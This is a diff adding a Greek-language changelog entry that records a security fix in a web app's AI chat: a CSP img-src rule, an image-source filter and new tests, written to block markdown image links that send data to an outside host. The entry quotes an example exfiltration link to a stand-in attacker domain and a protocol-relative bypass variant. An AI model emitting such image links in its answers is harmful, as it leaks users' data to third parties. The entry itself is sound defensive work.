@@ -3,6 +3,60 @@
 Μία εγγραφή ανά βήμα: τι έγινε, τι δοκιμάστηκε, αποτέλεσμα. Το νεότερο
 πάνω.
 
+## 2026-10-31η (οδηγία 36 — ΑΣ2-3.1 διορθώθηκε: CSP `img-src` για το chat)
+
+Δεύτερη από τις τέσσερις σοβαρές διορθώσεις. ΑΣ2-3.1: ένα markdown
+`![x](https://evil.example/t.gif?d=...)` μέσα σε απάντηση chat
+renderάρεται σήμερα ως πραγματικό `<img src=...>` σε ΟΠΟΙΟΔΗΠΟΤΕ origin
+— καμία CSP `img-src` δεν υπήρχε (`next.config.mjs`'s
+`APP_SECURITY_HEADERS` είχε μόνο `frame-ancestors 'none'`, το ίδιο
+«μία οδηγία» που καταγράφει το ΑΣ2-7.4), και το
+`src/components/chat/message-content.tsx` δεν είχε κανένα `img`
+override — react-markdown δείχνει το default renderer, καμία
+φιλτραρισμένη πηγή. Τίποτα πάνω από το ρεντερ δεν καθαρίζει ήδη ένα
+τέτοιο URL: ούτε το system prompt (δεν αναφέρει ποτέ εικόνες), ούτε το
+`web-sources.ts` (μόνο τα δικά του citation URLs), άρα το μόνο σημάδι
+που έλειπε ήταν αυτό.
+
+Δύο ανεξάρτητα σημεία διακοπής, ίδιο σχήμα με το ήδη υπάρχον
+frame-ancestors + X-Frame-Options:
+
+`next.config.mjs`: `Content-Security-Policy` γίνεται
+`"frame-ancestors 'none'; img-src 'self' data: blob:"` — καμία εξωτερική
+προέλευση εικόνας δεν χρειάζεται κανένα γνωστό χαρακτηριστικό του chat
+(τα Unsplash hotlinks αφορούν μόνο τον website builder, κάτω από
+ξεχωριστό CSP· τα δικά του attachment previews του chat είναι ήδη
+client-side blob URLs).
+
+`src/components/chat/message-content.tsx`: νέα εξαγόμενη συνάρτηση
+`isAllowedChatImageSrc` (`'self'`-relative/`data:`/`blob:`, ΟΧΙ
+πρόθεμα-συμβατό διπλό `//` που θα ήταν στην πραγματικότητα εξωτερικό
+origin) και νέο `img` component που δεν renderάρει τίποτα όταν αυτή
+αρνείται. **Η πρώτη εκδοχή είχε ένα πραγματικό κενό που το έπιασε η
+ίδια η δοκιμή πριν φτάσει σε commit:** `src.startsWith("/")` μόνο δεν
+απέκλειε `//evil.example/...` (protocol-relative URL, πραγματικό
+εξωτερικό origin) — διορθώθηκε με ρητό έλεγχο `startsWith("//")` πρώτα.
+
+`scripts/tests/message-content.test.mjs`: νέο αρχείο, 11 έλεγχοι — η
+συνάρτηση βγάζεται από το πραγματικό αρχείο και τρέχει αυτόνομη (ίδια
+τεχνική με το `locale-resolution.test.mjs`, αφού το component έχει
+πραγματικά npm dependencies — react, react-markdown — που ο
+περιορισμένος loader των `*.test.mjs` δεν μπορεί να λύσει χωρίς να
+γράψει στο node_modules).
+`scripts/tests/message-content.mutation.mjs`: νέο αρχείο, 3/3
+πιάστηκαν (το ίδιο protocol-relative κενό, ο φύλακας αφαιρεμένος
+εντελώς, η λίστα να ανοίγει σε `https:`).
+`scripts/tests/entitlement-trust.test.mjs` §7: νέος έλεγχος ότι το CSP
+header περιέχει το `img-src` και όχι `https:` μέσα του (57 -> 58
+έλεγχοι).
+
+`docs/SECURITY-REPORT.md`: η γραμμή ΑΣ2-3.1 γίνεται «διορθώθηκε»· η
+σύνοψη ξαναμετρήθηκε σε σοβαρό 4/2/2.
+
+`npm run gates`: 396/396 πράσινα (ένα νέο αρχείο, `message-content.test.mjs`· το `self-claims.test.mjs` χρειάστηκε το δικό του δικαιολογημένο βήμα 40 -> 42, ίδιο σύμβολο ήδη στη βάση, εκτός του corpus του σκάνερ — `next.config.mjs` δεν σκανάρεται). `npm run build:ci`: πράσινο.
+
+**ΝΕΑ MIGRATIONS ΝΑ ΤΡΕΞΕΙΣ: καμία**
+
 ## 2026-10-31ζ (οδηγία 36 — ΑΣ2-3.2 διορθώθηκε: chat attachments τυλιγμένα)
 
 Πρώτη από τις τέσσερις σοβαρές διορθώσεις που ζήτησε η οδηγία 36 πριν
